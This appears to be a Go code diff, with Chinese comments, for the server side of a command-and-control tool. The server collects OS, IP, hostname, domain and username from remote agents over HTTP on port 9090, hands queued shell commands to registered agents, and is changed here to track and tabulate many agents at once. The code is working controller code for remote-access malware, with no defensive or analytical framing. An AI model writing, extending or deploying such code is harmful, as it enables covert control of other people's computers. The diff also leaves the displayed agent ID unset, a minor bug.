@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"encoding/base64"
 	"fmt"
+	"github.com/olekukonko/tablewriter"
 	"io/ioutil"
 	"math/rand"
 	"net/http"
@@ -18,7 +19,6 @@ import (
 	"github.com/axgle/mahonia"    //中文编码
 	"github.com/c-bata/go-prompt" // 增加tab 下拉菜单
 	"github.com/fatih/color"
-	"github.com/olekukonko/tablewriter" //表格
 )
 
 const help_shell = `
@@ -40,7 +40,6 @@ var (
 	OS, Arch, IP, hostname, domain, username string //  func info_os()  表格变量
 	cmd                                      string = ""
 	AGENTS                                   map[string]string
-	info                                     string = ""
 	session_id                               string
 	ID                                       string = ""
 	//全局变量
@@ -71,19 +70,16 @@ func sayhelloName(w http.ResponseWriter, r *http.Request) {
 	//info
 	if url_info.MatchString(r.URL.Path) {
 		data := mahonia.NewDecoder("gbk").ConvertString(string(r.Form.Get("data")))
-		info = data
-		AGENTS = make(map[string]string)
 		url_path, _ := regexp.Compile(`[A-Z]+`)
 		id := url_path.FindString(r.URL.Path)
-		AGENTS[id] = "ok"
-		ID = id
+		AGENTS[id] = data
 		fmt.Println(data)
 
 		//md执行命令
 	} else if url_cm.MatchString(r.URL.Path) {
 		url_path, _ := regexp.Compile(`[A-Z]+`)
 		var id = url_path.FindString(r.URL.Path)
-		fmt.Println(id)
+		//fmt.Println(id)
 		_, ok := AGENTS[id]
 		if ok {
 			if cmd != "" {
@@ -223,26 +219,32 @@ func sayhelloName(w http.ResponseWriter, r *http.Request) {
 //    return err
 //
 //}
-func info_os() { //定义表格  info信息
-	info := strings.Split(info, "**")
-	OS = info[0]
-	IP = info[1]
-	Arch = info[2]
-	hostname = info[3]
-	domain = info[4]
-	username = info[5]
-	//定义 info 信息中的变量
-	data := [][]string{
-		[]string{ID, OS, IP, Arch, hostname, domain, username},
-	}
-	//将info信息做成表格
-	table := tablewriter.NewWriter(os.Stdout)
-	table.SetHeader([]string{"ID", "操作系统版本", "IP地址", "x86 OR x64", "主机名", "域名", "用户名"})
 
-	for _, v := range data {
-		table.Append(v)
+//打印全部主机信息
+func info_os() {
+
+	for _,v:=range AGENTS{
+		info := strings.Split(v, "**")
+		OS = info[0]
+		IP = info[1]
+		Arch = info[2]
+		hostname = info[3]
+		domain = info[4]
+		username = info[5]
+		//定义 info 信息中的变量
+		data := [][]string{
+			[]string{ID, OS, IP, Arch, hostname, domain, username},
+		}
+		//将info信息做成表格
+		table := tablewriter.NewWriter(os.Stdout)
+		table.SetHeader([]string{"ID", "操作系统版本", "IP地址", "x86 OR x64", "主机名", "域名", "用户名"})
+
+		for _, v := range data {
+			table.Append(v)
+		}
+		table.Render() // Send output
 	}
-	table.Render() // Send output
+
 } //定义表格  info信息
 
 func Scanf(a *string) {
@@ -342,6 +344,7 @@ func Options() { //定义tab 下拉菜单选项参数
 
 }
 func main() {
+	AGENTS = make(map[string]string)
 	http.HandleFunc("/", sayhelloName) //设置访问的路由
 
 	go http.ListenAndServe(":9090", nil) //设置监听的端口
